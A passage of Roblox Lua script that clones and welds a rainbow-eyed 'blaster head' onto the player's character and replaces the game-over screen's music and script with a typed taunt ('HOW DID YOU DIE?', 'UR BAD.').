if v.Name == 'Head' then
clone19 = v:Clone()
clone19.Name = 'SmallBlasterHead'
clone19.Parent = char
clone19.Anchored = false
clone19.Union.Anchored = false
clone19.BodyUnion.Anchored = false
clone19.Eye.Anchored = false

for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'Eye' then
v.Name = 'BlasterEye'
end
end

weld1 = Instance.new('Weld',clone19)
weld1.Part0 = clone19
weld1.Part1 = char['Head']
weld1.C0 = CFrame.new(9, -3.6, -3)*CFrame.Angles(0, 0, 0)
clone19.Transparency = 0
end
end

spawn(function()
repeat
    for hue = 0, 1, 1/360 do
        wait()
for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'BlasterEye' then
    v.Color = Color3.fromHSV(hue, 1, 1)
    end
end
end
until false
end)
end)

spawn(function()
player = game.Players.LocalPlayer

player.PlayerGui:WaitForChild('GameOver')
player.PlayerGui.GameOver.Sound.SoundId = 'rbxassetid://256575709'--- changes game over music
player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel.Script:Destroy()--destroys original the local script you want to modify or change completely
local function SCRIPT_JPEX75_FAKESCRIPT()--- making it into a function so that you can compile it into a local script
script = Instance.new('LocalScript', player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel)-- creates a new local script instance
 player = game.Players.LocalPlayer
char = player.Character
mouse = player:GetMouse()
sound = Instance.new("Sound", script)
sound.Name = 'Voice'
sound.SoundId = 'rbxassetid://5416491219'
space = [[ 
]]

repeat wait()
char = player.Character
until char.Humanoid.Health <= 0.2
wait(6)
local word = "HOW DID YOU DIE?"
local length = string.len(word) 
for i = 1, length do
script.Parent.Text = string.sub(word, 1, i)
clone = sound:Clone()
clone.Parent = script
clone:Play()
wait(0.03)
end
wait(1)
word = "UR BAD."
length = string.len(word) 
for i = 1, length do 
script.Parent.Text = string.sub(word, 1, i)
clone = sound:Clone()
clone.Parent = script
clone:Play()
wait(0.03)
end
local mous
mous = mouse.Button1Down:Connect(function()
Instance.new("StringValue", player.Character).Name = "Confirmed"
mous:Disconnect()
end)
end
coroutine.resume(coroutine.create(SCRIPT_JPEX75_FAKESCRIPT))
player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel.LocalScript.Name = "Script"
end)

game.Players.LocalPlayer.PlayerGui.GameOver.Sound.Looped = true

repeat wait() until game.Players.LocalPlayer.Character.Humanoid.Health == 0
music:Stop()

game.Players.LocalPlayer.Character.Bone:Destroy()
